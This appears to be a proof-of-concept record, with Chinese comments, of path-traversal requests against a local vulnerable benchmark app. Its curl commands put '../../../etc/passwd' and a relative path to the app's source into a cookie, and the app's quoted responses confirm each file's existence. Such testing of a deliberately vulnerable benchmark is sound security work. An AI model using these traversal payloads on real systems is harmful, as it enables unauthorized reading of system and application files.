# 1. 获取表单（设置初始Cookie，可选步骤）
curl -k -c /tmp/cookies.txt 'https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00002'

# 2. 路径遍历 - 检测文件存在性（/etc/passwd）
curl -k -b 'BenchmarkTest00002=../../../etc/passwd' -X POST 'https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00002'
# 响应: "Access to file: './testfiles/../../../etc/passwd' created. And file already exists."

# 3. 路径遍历 - 检测不存在的文件
curl -k -b 'BenchmarkTest00002=../../../nonexistent' -X POST 'https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00002'
# 响应: "But file doesn't exist yet."

# 4. 路径遍历 - 读取应用自身源码
curl -k -b 'BenchmarkTest00002=../testcode/BenchmarkTest00002.py' -X POST 'https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00002'
# 响应: "Access to file: './testfiles/../testcode/BenchmarkTest00002.py' created."